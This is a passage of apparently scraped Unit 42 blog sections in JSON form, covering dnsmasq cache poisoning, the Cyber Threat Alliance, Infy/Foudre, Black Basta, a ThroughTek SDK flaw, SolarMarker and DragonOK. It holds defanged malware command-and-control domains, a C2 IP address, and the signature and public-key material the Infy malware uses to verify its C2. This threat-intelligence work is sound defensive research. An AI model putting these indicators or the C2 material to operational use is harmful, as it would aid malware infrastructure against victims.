ebaa572eb6eb4bef6d1a5043c5403bf796626a478205b344c4dc8c2\n4aff04954efd6cb02b1ba18831a72d44b2346db94e944a9f96c652f5944834d0\nd735d39de62009d09d7125f71cd774b23b6ab4a51d1dbb3d49003a5657b3477f\n9ad38281585897b1d49632ad049c700814f72e20edc46bbc43ba510413ac6f92\n877453c0e614e732eb9ee378693cf92263d2373e09c8287e3a4a821ecee29764\nb82c7535e41cddade675587ddaac9cb63fdf1973968f10f3a2bc1ea5409a29c2\nec824085dac0d7e0d2e3953d241756a78635a32ad442b7909f0895fd62b08010\n5c073adb376b57c99faa9cf10114beda732b13d04b7ed45a32c23eb043ec608f\n8d1db84b71eb1f38f95c13c89a6adfbc64d7ca5c5a5165ae7919e0d1e6fadc45\nb278ccf189d51b085390a985526ff37455ebe249ca9da69f64e2376979c56e6b\ne99df30a89dee25f56c2f35b20de2206406934f2e6ab043e299482649dce2cb8\n8e738b2239bbca9f50eab5f3cf3cbe58138e3b2515221c67e7eb934e2d3c7486\nb904e2823144ca9ab3161c3e508a88dc35922340e4ff2858e06b40e638bfd359\n99b70d49377117000eaf367c037ed68c4898b0d8769f7bff88a438a9d82db214\n982e2abc769f579a8753e8b2f65e0b0bbfbbdbae14b88f0ed697b635a9f4e38f\n03cb44736cdd60318af8399047507b011b95fadd4784b1607b28ad4940a9a36e\ne9f42c7fbedf0054391c3a85b79a34b5be134b40a83961cc90d0e473380fde1c\n6c45909d6311f8d356ddc704b27bd975cb3336a7b6e172206165bff613f94a2a\n9025c9b8cfc57e7dda5e742f18d69b4c4477f9254d10c5df15b7a6ffcf7d5985\nae3cddb0f665d739ebf5342a968585a5d13d54068ef59a51e82e739d184c6b3b\nd5baf4a27994ef2110bcc3a0b3ff2cd3815bac36d271462d1a39f77063bae9a5\nb0593829ea59d267f511f2685aa8ecf31860e123e0928ca8bf3fc1e30b3c4953\n1c30a54a8ad30faff0a7b309d377127ed739ea80c510d7526bbb5cbe6ef5cfc9\n498fd1c4cb16f39974555d6e596fcea6c7da73f9f0f30f57fdc8177fc3feaa4e\n1c604e040c04be9fad3129d7bd9c69b7f8057050b2002605dde1f5e60817f89a\n5dfd79503b19b67052ec060d74e1f2a9a5ee34de74d578c5b4499468bad8f1cb\nbc4c98116fadbcef2abfd0fe62a15b154a3b8a8eb329a877d64edc59260519c4\n9c794069b4d6346f8152b938e4f846af63d1f1015c935579d99af1c434789406\n7923c59d1405deacaceb26722db97714cf955610e02bf6d28051505331603606\na03bc280123541518845cc167b4e812bbe9682696af4eeac041385cc0a00f5c6\nc7f3673ca116f76b16a7e00d81553abb0df02e75d4ac8fb6d3af52d351d9b46a\n824d080a4da2275951a28285b66faac1698205dff181fe5fa1cf172ac1a17d8f\n0b04028774f0e166dcbe0f993b72c430dc15364e9cc52c221bdadcc9833816f2\n22e9260c6a4af1d42c353c7004cb2f5f245cea5e22572b111fcef4318c17e567\n904a4799edf642e6e685a137c88691f08b51643e539bea8de9e4cdf8c6251c7f\n7a9e3038d498d5ecaed19f6a80d9b0b7d73d47e669be8d61ca32d87566d7a035\n16ea765b2c51eadc61c6501b4ba96073a7d50f8cd7898285ffad49ba14a121dd\n18199bb3ad69901ef0040aa7445d6f0c8571a19cdade3115ffc9c142c0b5b721\nb940dc214f6a0be58e93f07aafcbc5a7518544f745413360269949664909fecd\n2d26bc42a499c4658523193ade85df13ab397d375fa593a757c54a6f1c71f221\n94a38857ebeed7d10480fb91a391a891d5a11137fabb8fc67b71c989b5e328e6\n116da8803ac9b2dd7e1149567f227d552e84db86dd7a33ad69e15b560f0fa177\n2945e6424f51e6077620a867e0f9c725b9b816164366912289ab6c24fdfcb9e6\n88d1a891cfdf09b7e1882582a82c3218d5606ed530764d34ee1410198ca9ee8b\n96424d66b7423dc54b35e4968a809a8b67d1dd8e7d8d3b0d84434edb94c822c5\n3158906cf7cb3186654bbb62d087b9a150c12c51d2ad67dd9003abeb0f69626a\n4e62dcea72cf73481dd8dae2bbeb8e1352a5f2510f3deb98ec0b653a4d21f8d8\n5370711dd45b84b9644b635d03baad08d75ff740364e93ed023adc9c4a297c43\n02254a03f08055399806b6457ee5e4fe6cfc47c6f75254434a14332d4c43afe5\nbf07b4ba117eb7d0ac59cbdd775e6a509c06a462b709b4f2d10979c9e5b3cf85", "source": "Palo"}, {"title": "Introduction", "content": "DNS masquerade (dnsmasq) is a widely used open source DNS resolver. While one might not be familiar with dnsmasq by name,it is used by many projects and hardware firmwares around the world, from Kubernetes to routers and other products.\nOver the years,multiple critical vulnerabilitieshave been found in dnsmasq. Recently, security researchersdiscoverednew issues that continue to make dnsmasq vulnerable. These vulnerabilities can lead to DNS cache poisoning, denial of service (DoS) and possibly remote code execution (RCE). In this blog, I will review these vulnerabilities in dnsmasq, with a deep dive on DNS cache poisoning. I will also cover the effect such issues have on cloud products such as Kubernetes.\nPalo Alto Networks customers are protected from the attacks outlined in this blog withNext-Generation FirewallwithDNS Security, andPrisma Cloud.", "source": "Palo"}, {"title": "Background", "content": "As covered in detail in my previous blog, \"The History of DNS Vulnerabilities,\" port and transaction ID randomization is one of the key methods a modern DNS resolver uses to protect against cache poisoning.\nCache poisoning is an attack in which one poisons the DNS resolver's cache by sending malicious responses. The attack happens after a DNS resolver sends a request to an upstream server. At this point, the attacker sends fake responses that appear to come from the server the victim organization contacted. The DNS resolver receives the malicious responses and caches them. From then on, when a victim organization asks the DNS resolver for this domain, it will answer with the IP address of an attacker controlled server. This results in redirections that can be very hard to detect. For example, a user might browse to a bank's website, having typed the URL correctly \u2013 but instead of returning the IP address of the bank, a cache poisoning attack could cause the DNS resolver to send the user to an attacker's IP address instead. Because of the serious implications of this possibility, DNS vulnerabilities are often critical.\nOne of the mitigations against this attack is to randomize the transaction ID and source port of the request from the resolver to the upstream server. By randomizing those two values, each is 16 bits long, and each request has a 32 bit key that an attacker has to match in order to make malicious responses get accepted by the DNS resolver.", "source": "Palo"}, {"title": "Conclusion", "content": "These vulnerabilities show once again why DNS cache poisoning is relevant to this day, despite all the mitigations that have been added over the years.\nHaving said that, with secure browsing and certificates usage nowadays, even if an attacker manages to poison a DNS server for a domain, it is most likely that the victim organization's browser won't load the page because the certificates won't match. But the technique can still be used for enormous DoS attacks by poisoning an ISP's DNS resolver and forwarding requests to a nonexistent IP address.\nIn the cloud, however, the problem is much bigger. As discussed earlier, Kuberenetes used to use dnsmasq as its default DNS resolver until not so long ago. Even today, users can still choose to use dnsmasq instead of CoreDNS. In such a scenario, an attacker who manages to poison a cluster's DNS resolver can cause an enormous amount of damage because, unlike browsers, cloud applications usually don't do certificates verification.\nAn attacker who breaches a single container can easily use this attack to spread further into the entire cluster, even without a container escape vulnerability.\nPalo Alto Networks customers are protected from the attacks outlined in this blog in a variety of ways. Palo Alto Networks Next-Generation Firewalls can block DNS attacks by detecting suspicious DNS queries and anomalous DNS responses. Attacks related to exhaustion or high quantities of traffic are handled with DoS or zone protection profiles that are built into the firewall. These protections are in addition to coverage of DNS threats and indicators through DNS Security.\nFurthermore, Prisma Cloud customers are protected from this threat through the Prisma Cloud Compute Host and Container Vulnerability Scanner, which alerts on vulnerable software components. The attack described in this blog requires one of the following, in addition to an old and vulnerable dnsmasq deployment:\nA breach in the internal network of the cluster to be able to send malicious packets to the DNS server from the inside. \nA misconfigured DNS resolver that is open to the internet.\nSuch scenarios almost always happen by attackers exploiting outdated and misconfigured applications, which are monitored by the Prisma Cloud Compute Compliance Protection.", "source": "Palo"}, {"title": "Introduction", "content": "The Palo Alto Networks vision for threat information sharing is that cybersecurity vendors should share the intelligence that they all individually collect with each other and with whomever else has the capacity to consume it. In that way, each vendor can build more innovative products with that superset of intelligence and better protect their combined customer bases because of it.\nProject Redstone, the results of which we announcedtoday, was a 90-day proof-of-concept designed to test the value and practicality of security vendors collaborating against one cyber adversary campaign in the summer of 2015: the campaign associated with CryptoWall version 3.  The project showed immediate tactical success and demonstrated the value of such a collaborative information sharing arrangement. That said, the project also identified four capability gaps that Palo Alto Networks must solve in order to share intelligence on 5,000 adversary campaigns, every day in real time:\nHow to convert large volumes of Indicators of Compromise into prevention controls; \nHow to measure alliance member contributions with more granularity; \nWhat is the common set of success metrics for deployed security controls across Alliance membership; and \nWhat is the right sharing architecture that works at scale.", "source": "Palo"}, {"title": "Introduction", "content": "Palo Alto Networks has a bold vision about threat Information Sharing. We believe that cyber threat intelligence collected by security vendors should be shared by all. We believe that the intelligence all security vendors collect through their vastly deployed product sets should not be marketed individually to promote product differentiation or rolled out as an additional revenue stream. Instead, we believe that all security vendors should have access to the same threat intelligence so that individually each vendor can build better and more innovative products to protect its customers. Those innovations are how the security vendors will distinguish their products in the market place. More importantly, the result of that cooperation among security vendors will exponentially provide better threat prevention capabilities to the shared global customer base. Palo Alto Networks helped found the Cyber Threat Alliance with that vision in mind.\nOfficially formed on September 4, 2014, with nothing more formal than a common Non-Disclosure Agreement (NDA), the Cyber Threat Alliance members began working through the issues of how a group of competitive security vendors could share threat intelligence with each other. Two issues became paramount: building trust between all members and establishing an infrastructure that could facilitate the sharing of large volumes of threat intelligence.\nWhile the Cyber Threat Alliance began working those two issues,other security vendors who agreed with the vision came on board: Barracuda, ReversingLabs, Telefonica, and zScaler. At the White House Summit on Cybersecurity and Consumer Protection held at Stanford University in February 2015, President Obama signed an executive order directing the creation of new Information Sharing and Analysis Organizations (ISAOs) andpraised the Cyber Threat Allianceas a model for the way forward.\nThree organizational principles distinguish the Cyber Threat Alliance from other existing information sharing groups.\nThe first is that every participating member must contribute. No members can simply consume the shared intelligence. They must share in equal quantities and the Cyber Threat Alliance measures the volume and quality of intelligence contributions daily to ensure compliance. \nThe second is that whatever is shared by individual members is deployed across all other members' product lines. For example, when Palo Alto Networks shares malware samples with the Cyber Threat Alliance, all other Cyber Threat Alliance members use that intelligence to strengthen their individual product sets and vice versa. \nThe third is that Alliance members will update their security controls to their deployed products within their respective customer bases without the customer having to review and install themselves. In thetraditional ISAC (Information Sharing and Analysis Center) modelfor example, customers must decide that they want to share intelligence. They have to package it up and send it off to their respective ISAC Security Operations Centers. Once the new intelligence arrives, the ISAC Security Operations Center must process the information, transform it into useful intelligence and distribute it to the other ISAC members. Once the ISAC members receive the new intelligence, they have to read it, understand it, decide if it is pertinent to their organization and if it is, develop security controls for their organization and deploy them in a timely manner. The process provides good intelligence, but it is also slow and cumbersome. The Cyber Threat Alliance system eliminates the customer as a middleman. Alliance members automatically deploy the right security controls to their deployed systems making the process more efficient for their respective customer bases.\nIn June 2015, the Alliance founding CEOs met to discuss the next steps for the Cyber Threat Alliance. Now that trust had been established and a rudimentary infrastructure had been built, where should they take the organization?\nThe original charter stated that all members would share 1,000 unique malware samples with each other daily as the price of admission to the Cyber Threat Alliance. But security experts estimate thatadversaries create approximately 1 million unique pieces of malware a day. The CEOs understood that 1,000 shared samples a day between Alliance members is not that significant. On one hand, having competitors share and collaborate on threat intelligence is a good thing for the security industry. On the other, if we are going to go through all this effort, shouldn't it be for some meaningful goal?\nThe Big Hairy Audacious Goal (BHAG) that emerged was what if the Cyber Threat Alliance members decided to share adversary campaign information with each other? Instead of simply sharing newly discovered malware, what if the Cyber Threat Alliance dedicated itself to sharing the entire playbooks, the Indicators of Compromise throughout thecyber attack lifecycle, for every cyber adversary operation that is known? The implications of that idea could be a game changer.\nExperts from the Cyber Threat Alliance estimate that the number of adversary campaigns that exist in the world at any given time could be as many as 5,000. This is not the number of attacks. This is the number of existing playbooks that adversaries use to conduct those attacks on multiple victims. Other experts not in the Cyber Threat Alliance say the number is higher -- roughly 25,000 -- and others say it is much smaller, roughly 500. Regardless of the actual number, what is interesting is that the number is not 1 million or even 100,000. The number of existing adversary playbooks is in the thousands. Analysts can track a thousand items in a spreadsheet. This is a manageable number, and that means something that can be done if the Cyber Threat Alliance focuses the right resources on the problem.\nIf the Cyber Threat Alliance was able to share Indicators of Compromise (IOCs) down the cyber attack lifecycle for every adversary campaign that is known, members of the Cyber Threat Alliance could automatically deploy threat prevention controls to their products and to their customer base potentially in real time. If the Cyber Threat Alliance membership grew large enough, the membership roles would reach a tipping point where every organization \u2013 commercial, government and anything else \u2013 that connects to the Internet would have at least one Cyber Threat Alliance member's product deployed within their networks helping to defend it against attacks. At that point, every organization on the planet connected to the Internet will have the latest and greatest attack prevention controls within minutes of discovery.\nThat is a bold and disruptive idea and it could revolutionize the business.\nThe founding CEOs decided to run a proof a concept. Instead of tackling 5,000 adversary campaigns at once, they tasked the group to focus on one campaign: collaborate on one playbook to see if the intelligence collected and shared amongst members is better than what the individual Alliance members collect on their own. And they gave the team 90 days to do it. The name of the project was called Redstone and the CEOs met on October 1, 2015, to discuss the results.", "source": "Palo"}, {"title": "Conclusion", "content": "The vision of the Cyber Threat Alliance is a classic BHAG (Big Hairy Audacious Goal). Project Redstone was the Alliance's proof of concept that the vision is possible. While the result showed some immediate tactical success, Palo Alto Networks realizes that there are four capability gaps that must be solved in order for the effort to scale. These are all hard but solvable problems. I am hopeful. In the mean time, when non-Alliance vendors come to your door to pitch their wares, ask them why they are not member of the Cyber Threat Alliance. We currently have eight members. We want 50 and we need their help.", "source": "Palo"}, {"title": "Introduction", "content": "In February 2017, we observed an evolution of the \"Infy\" malware that we're calling \"Foudre\" (\"lightning\", in French). The actors appear to have learned from our previous takedown and sinkholing of their Command and Control (C2) infrastructure \u2013 Foudre incorporates new anti-takeover techniques in an attempt to avoid their C2 domains being sinkholed as we did in 2016.\nWe documented ouroriginal researchinto the decade-old campaign using the Infy malware in May 2016. A month after publishing that research, wedetailed our takeover and sinkholingof the actor's C2 servers. In July 2016, at Blackhat U.S., Claudio Guarnieri & Collin Andersonpresented evidencethat a subset of the C2 domains redirecting to our sinkhole were blocked by DNS tampering and HTTP filtering by the Telecommunication Company of Iran (AS12880), preventing Iran-domestic access to our sinkhole.\nBelow, we document these changes to the malware, and highlight some ongoing mistakes and how we leveraged them to learn more about this campaign.", "source": "Palo"}, {"title": "Conclusion", "content": "In ourPrince of Persia blog, we noted that this campaign had been active for at least a decade. We followed up with ourPrince of Persia: Game Over blog, documenting our takedown and sinkholing of the adversary's C2 infrastructure.\nRegarding the actions by the Telecommunication Company of Iran to prevent the C2s from resolving to our sinkhole,  Guarnieri & Andersonnote\"The filtering policy indicates that Iranian authorities had specifically intervened to block access to the command and control domains of a state \u00adaligned intrusion campaign at a country level\".\nWe shouldn't be surprised then to see Infy return \u2013 fundamentally the same malware, targeting the same victims.\nThe actors understand that they needed a more robust C2 infrastructure to prevent infiltration and takedown. DGA adds some resilience, but is not impervious to takeover.\nHowever, using digital signing is an effective C2 defense mechanism. Without access to the private keys, it's not possible to impersonate a C2 even if a DGA domain is registered by a researcher. It's possible that the private keys are held locally on the C2 server, but without access to the C2 we can't confirm this particular potential vulnerability in their infrastructure.\nPrince of Persia is persistent, indeed.", "source": "Palo"}, {"title": "IOC", "content": "As of time of publishing, the actor had registered DGA domains corresponding to dates through end-July 2017. Although the DGA algorithm allows the Top-Level Domains (TLDs) of \".space\", \".net\" and \".top\", we note predominantly \".space\" domain registrations, just one \".top\", and no \".net\". Of special interest is multiple \".site\" domains resolving to the C2 IP address. We suspect that this may be different malware \u2013 possibly, as we saw with the previous Prince of Persia investigations, an as-yet unidentified more full-featured Infy/Foudre variant.\nns1.2daa46f1[.]space\nns2.2daa46f1[.]space\n017eab31[.]space\n01ead12b[.]space\n0ca0453a[.]site\n14c7e2dc[.]space\n15bb747b[.]site\n15ce27c5[.]site\n16e53040[.]space\n17ecf559[.]site\n1cb3c4c0[.]space\n1d4ee030[.]space\n23dafa1e[.]space\n2daa46f1[.]space\n341a436d[.]space\n3828b6ed[.]site\n39451f31[.]space\n3a6e08b4[.]site\n3c6e6571[.]space\n3e8718c3[.]site\n3f4572f4[.]site\n431d73fb[.]space\n43ec206d[.]top\n4b6955e7[.]space\n4e422fa7[.]space\n4f2f867b[.]site\n5aad7667[.]space\n60ebc5cf[.]site\n61e200d6[.]space\n62c91753[.]site\n63c0d24a[.]space\n6bb4f456[.]space\n76ede1bd[.]space\n7ba775ac[.]site\n8447b18a[.]space\n869182ff[.]site\n884efdfb[.]space\n8cc7767f[.]site\n8dceb366[.]space\n8ee5a4e3[.]site\n8fec61fa[.]space\n9155ccba[.]space\n9877fa8b[.]space\n98e38091[.]space\n9c1f58ab[.]site\n9f233843[.]space\na20af0d2[.]space\na367590e[.]site\na4a55efc[.]space\na64c234e[.]site\nb4a3174b[.]space\nc4c9e3c4[.]space\nc5aeee9c[.]site\nd14b13d8[.]site\nd260045d[.]space\nd3a26e6a[.]space\nd4606998[.]site\nd50dc044[.]space\nd74b7e1d[.]space\ne00dc810[.]space\ne652fc2c[.]space\neb18683d[.]site\nf196b269[.]site\nf8eb516c[.]space\nf9e29475[.]site\nfac983f0[.]space\nfbc046e9[.]site\n198.252.108[.]158 Hawkhost Canada \u2013 Dedicated hosting (all current resolutions malicious).\nNote that we identified several other IP addresses historically related to some of these domains, but research concludes that these are registrar-default hosts rather than C2 servers.", "source": "Palo"}, {"title": "Appendix", "content": "2b37ce9e31625d8b9e51b88418d4bf38ed28c77d98ca59a09daab01be36d405a4d51a0ea4ecc62456295873ff135e4d94d5899c4de749621bafcedbf4417c4727ce2c5111e3560aa6036f98b48ceafe83aa1ac3d3b33392835316c859970f8bc7e73a727dc8f3c48e58468c3fd0a193a027d085f25fa274a6e187cf503f01f74da228831089c56743d1fbc8ef156c672017cdf46a322d847a270b9907def53a56bc9f6ac2f6688ed63baa29913eaf8c64738cf19933d974d25a0c26b7d01b9ac7c6206eaf0c5c9c6c8d8586a626b49575942572c51458575e51cba72ba2096a4db605d501d3a5ca2b0e3d8296d552fbbf048ee831be21efca407c45bf794b109", "source": "Palo"}, {"title": "Appendix", "content": "Replicating the malicious c2 server domain 39451f31[.]space:\ndom file:\n39451f31.space2017138\nsig file:\n089EABE330EFD99602C164E889B44E16B8284BB1834A29F16C4BE8CE52FF507F9592E541DBEF85F3C15312583057CB1151B4027C22FB9A776CA112E4922D9BEB03D6682393350C9CE3BAABD92F02D620D81CCF38430AB340B048BE230240AACDB93F7AC8B96BFEDF68B8D2964558E6B9BC5E6BC361A876B71FB54A45CFA9E327B335CEDF34DB904E70CBBD1C5468411AC0677956156643209649D6551427652FC7C8487490D69CEE5DAB6B8B46764214B21E5B8E9AF866AF95CB883523B534412E07D25A956438DC249F15AEB7238CDC87A1B3BB020A096A8BCC9F4CED0554470DCA45638382C24BD2F37767D0546A6C57E8D27679CD1C332AE744A1FDBBB771\npublic key\n4E0A4C6F636B426F783301000000030001000015DEAED84DB7C292D7DEB01D5EB8DBE40A289736E9050B60E11DF90AAEEA6D1504D1D5056A50D1C44E3E03A8294E226C947D667B491896C151D5BEF32931636881ED635ACBDF18F8ED48BC680FFA31D60CAAF4EFAB772737081A6BD6B3D6D74DC57394095B340F492BE9E11115E67B1EF6B278ABA92055EB68D5138FF64CD9C3433DD8A4EA5A9EE3BAF0BF9D2A334CA6979941E676C13B3DE015D68070E43E8D6442CA677AA53E3CF27FB1957B7AFA03044BDB143726EBB4BE27CCEAD5AF89E966E646B43913EF873C08B488B6D5140914869A133379B9753B5E046E462D18DB692EA3A263F3694AF37DDC388737581F12701BF75061940877C886F05AB9237B030000000100014E0A4C6F636B426F7833010000000300010000E915DED8174C9B15D81DA2BA072DD858F9641B294BEB78A98E88AFC4A060161B16BBA30881F50E33B8552A449ECCAB8917F4E07359E70D5D19272026A486DB1F39E73903422F0ECB072DACB7B71955726301D25E50507524A6AB50C4C60718F32A2F546AE764B149E271A52CFBD2A60F3795588A6436DC08F881B931130A0444F2F2A30C74CA24A1F153F6012E46FA5047355114E3BD67FC3E32A1CE6711460C96D2470D787E8DDAF9F12C58A8A1264B27917A7F13F19B6B7D3347D40A486EB68FDA1653A5808B9380026B1B4B6AF640F7C8ECAF9A5FD77E571494D7152038545B7E53704A14CFED581BBC579DDF542247F110CAF70194ADBDB114314EE4716303000000010001", "source": "Palo"}, {"title": "Introduction", "content": "Black Basta is ransomware as a service (RaaS) that first emerged in April 2022. However, evidence suggests that it has been in development since February. The Black Basta operator(s) use the double extortion technique, meaning that in addition to encrypting files on the systems of targeted organizations and demanding ransom to make decryption possible, they also maintain a dark web leak site where they threaten to post sensitive information if an organization chooses not to pay ransom.\nBlack Basta affiliates have been very active deploying Black Basta and extorting organizations since the ransomware first emerged. Although the Black Basta affiliates have only been active for the past couple of months, based on the information posted on their leak site, they have compromised over 75 organizations at the time of this publication. Unit 42 has also worked on several Black Basta incident response cases.\nThe ransomware is written in C++ and impacts both Windows and Linux operating systems. It encrypts users' data using a combination of ChaCha20 and RSA-4096, and to speed up the encryption process, the ransomware encrypts in chunks of 64 bytes, with 128 bytes of data remaining unencrypted between the encrypted regions. The faster the ransomware encrypts, the more systems can potentially be compromised before defenses are triggered. It is a key factor affiliates look for when joining a Ransomware-as-a-Service group.\nPalo Alto Networks customers receive help with detection and prevention of Black Basta ransomware through the following products and services:Cortex XDRandNext-Generation Firewalls(includingcloud-delivered security servicessuch asWildFire).\nIf you think you may have been impacted by a cyber incident, theUnit 42 Incident Response teamis available 24/7/365. You can also take preventative steps by requesting any of ourcyber risk management services.", "source": "Palo"}, {"title": "Conclusion", "content": "Black Basta ransomware operators have been active since at least April 2022. Although their RaaS has only been active for the past couple of months it had compromised at least 75 organizations at the time of this publication. Due to the high-profile nature and steady stream of Black Basta attacks identified globally in 2022, the operators and/or affiliates behind the service likely will continue to attack and extort organizations.\nPalo Alto Networks helps detect and prevent Black Basta ransomware in the following ways:\nWildFire: All known samples are identified as malware. \nCortex XDR:Identifies indicators associated with Black Basta.Anti-Ransomware Module blocks Black Basta encryption behaviors on Windows.Local Analysis detection for Black Basta binaries on Windows and Linux.Behavioral Threat Prevention prevents Black Basta behaviors. \nIdentifies indicators associated with Black Basta. \nAnti-Ransomware Module blocks Black Basta encryption behaviors on Windows. \nLocal Analysis detection for Black Basta binaries on Windows and Linux. \nBehavioral Threat Prevention prevents Black Basta behaviors. \nNext-Generation Firewalls: DNS Signatures detect the known C2 domains, which are also categorized as malware inAdvancedURL Filtering.\nIf you think you may have been compromised or have an urgent matter, get in touch with theUnit 42 Incident Response teamor call North America Toll-Free: 866.486.4842 (866.4.UNIT42), EMEA: +31.20.299.3130, APAC: +65.6983.8730, or Japan: +81.50.1790.0200.\nIndicators of compromise and Black Basta-associated TTPs can be found in theBlack BastaATOM.\nPalo Alto Networks has shared these findings, including file samples and indicators of compromise, with our fellow Cyber Threat Alliance members. CTA members use this intelligence to rapidly deploy protections to their customers and to systematically disrupt malicious cyber actors. Learn more about theCyber Threat Alliance.", "source": "Palo"}, {"title": "Introduction", "content": "A large number of IP cameras and surveillance systems used in enterprise networks were recently discovered to be vulnerable to remote code execution and information leakage due to CVE-2021-28372, a vulnerability in the built-in ThroughTek Kalay P2P software development kit that is used by many of these devices. Many users of IP cameras and surveillance systems are unaware of the built-in software and TCP/IP stacks in their devices, and can overlook related vulnerabilities as a result.\nHere, we cover how this specific vulnerability affects certain IoT devices.\nIn addition, this example highlights a big-picture problem for IoT devices. Vulnerabilities in built-in third-party technologies, many of which are not continuously maintained or are using legacy software, can leave IoT devices vulnerable in turn. This necessitates having proper visibility into devices in an enterprise network, as well as proper risk and vulnerability assessment.\nPalo Alto Networks customers receive protections against the vulnerabilities discussed here from theIoT Security platform.", "source": "Palo"}, {"title": "Background", "content": "Cybersecurity researchers identified a vulnerability in August 2021 that affects devices using the ThroughTek Kalay P2P Software Development Kit (SDK). Attackers can exploit this vulnerability to impersonate a device running ThoughTek Kalay SDK by using a 20-bit unique identifier. This would allow a malicious attacker to hijack a victim's connection, extract credentials from the traffic and gain unauthorized access to sensitive information on it. The ThroughTek Kalay SDK is built into various IoT devices, specifically IP cameras, video recorders and baby monitors. It is also used in various mobile and desktop applications on end-user devices.\nA majority of IoT devices using the vulnerable SDK are associated with real-time video and audio feeds. A successful attack on a device can leak private video or audio and result in the device being spoofed or its certificate being hijacked.CVE-2021-28372has been assigned to this vulnerability with a CVSS score of 9.6. For more details, read theICS-Cert advisory.", "source": "Palo"}, {"title": "Conclusion", "content": "A recently discovered vulnerability in the ThroughTek Kalay P2P SDK gains significance when considering how IP cameras and surveillance devices use this specific third-party SDK to provide P2P connection functionality. Network traffic analysis of affected devices reveal that major vendors use this specific SDK, making their devices vulnerable. However, due to the vulnerability being a part of an embedded component of the device, such connections and underlying vulnerabilities are often not exposed to the consumer.\nThis issue has been amplified in recent times through various exposed vulnerabilities that affect the supply chain for IoT devices. As a result, it is even more imperative for customers to have full visibility of the devices in their network, the traffic they generate and any underlying security risks associated with it.\nPalo Alto Networks IoT Securitycan help secure enterprise networks in the ways described, and includes protections for CVE-2021-28372. In addition, the platform uses patented anomaly-detection mechanisms to detect when devices with known vulnerabilities deviate from their normal network behavior, which might indicate they've been exploited. For example, the platform generates alerts for aberrant behavior such as a sudden appearance of traffic from a new source, an unusually high number of connections or an inexplicable rash of new international connections.", "source": "Palo"}, {"title": "Introduction", "content": "Recently, we've identified a new version of SolarMarker, a malware family known for its infostealing and backdoor capabilities, mainly delivered through search engine optimization (SEO) manipulation to convince users to download malicious documents.\nSome of SolarMarker's capabilities include the exfiltration of auto-fill data, saved passwords and saved credit card information from victims' web browsers. Besides capabilities typical for infostealers, SolarMarker has additional capabilities such as file transfer and execution of commands received from a C2 server.\nThe malware invests significant effort into defense evasion, which consists of techniques like signed files, huge files, impersonation of legitimate software installations and obfuscated PowerShell scripts.\nThis malware has been prevalent since September 2020 targeting U.S.organizations, and part of the infrastructure is still active as of 2022 in addition to a new infrastructure that attackers have recently deployed.\nHere, we dive into the technical details of the newly identified SolarMarker activity \u2013 specifically, how this malware often changes and modifies its attack patterns. For example, the recent version demonstrated an evolution from Windows Portable Executables (EXE files) to working with Windows installer package files (MSI files). According to the evidence we have, this campaign is still in development and going back to using executables files (EXE) as it did in its earlier versions.\nPalo Alto Networks customers received protections against the newly discovered campaigns throughCortex XDRandWildFire.", "source": "Palo"}, {"title": "Conclusion", "content": "This blog post documents recent changes in SolarMarker behavior patterns. These updates appear to upgrade evasion abilities in an attempt to stay under the radar and demonstrate that SolarMarker continues to evolve.\nIn recent years, the security industry has come to realize the importance of behavior-based detectors to reduce the dwell time of threats inside their network.\nPalo AltoWildFireCustomers are protected from the SolarMarker malware.\nPalo Alto Customers using CortexXDRPrevent or Pro are protected from such campaigns in different layers, including over 30 Behavioral Threat Protection, BIOC, and Analytics BIOCs rules that identify the tactics and techniques that SolarMarker uses at different stages of its execution.\nMost rules are not customized for SolarMarker and are based on unusual, rare behaviors \u2013 and therefore provide protection against many additional malware families and campaigns that use the same methods. On top of that, the Local Analysis Engine and WildFire integration provide additional layers of protection to Cortex customers.", "source": "Palo"}, {"title": "Introduction", "content": "The DragonOK group has been actively launching attacks for years. We first discussed them inApril 2015 when we witnessed them targeting a number of organizations in Japan. In recent months, Unit 42 has observed a number of attacks that we attribute to this group. Multiple new variants of the previously discussed sysget malware family have been observed in use by DragonOK. Sysget malware was delivered both directly via phishing emails, as well as inRich Text Format (RTF)documents exploiting theCVE-2015-1641vulnerability (patched inMS15-033) that in turn leveraged a very unique shellcode. Additionally, we have observed instances of theIsSpaceandTidePoolmalware families being delivered via the same techniques. While Japan is still the most heavily targeted geographic region by this particular actor, we also observed instances where individuals or organizations in Taiwan, Tibet, and Russia also may have been targeted.", "source": "Palo"}, {"title": "Conclusion", "content": "The DragonOK group are quite active and continue updating their tools and tactics. Their toolset is being actively developed to make detection and analysis more difficult. Additionally, they appear to be using additional malware toolsets such as TidePool. While Japan is still the most-targeted region by this group, they look to be seeking out victims in other regions as well, such as Taiwan, Tibet, and Russia.\nPalo Alto Network customers are protected against this threat in the following ways:\nMalware families are tagged in AutoFocus via a variety of tags (TidePool,NFlog,Sysget) \nThe following IPS signatures detect malicious network traffic:IPS signature 14365 (IsSpace.Gen Command And Control Traffic)IPS signature 14588 (Suspicious.Gen Command And Control Traffic)IPS signature 13574 (NfLog.Gen Command And Control Traffic)IPS signature 13359 (Nflog.Gen Command And Control Traffic) \nIPS signature 14365 (IsSpace.Gen Command And Control Traffic) \nIPS signature 14588 (Suspicious.Gen Command And Control Traffic) \nIPS signature 13574 (NfLog.Gen Command And Control Traffic) \nIPS signature 13359 (Nflog.Gen Command And Control Traffic) \nAll samples are appropriately marked malicious in WildFire", "source": "Palo"}, {"title": "Indicators", "content": "Malicious RTF 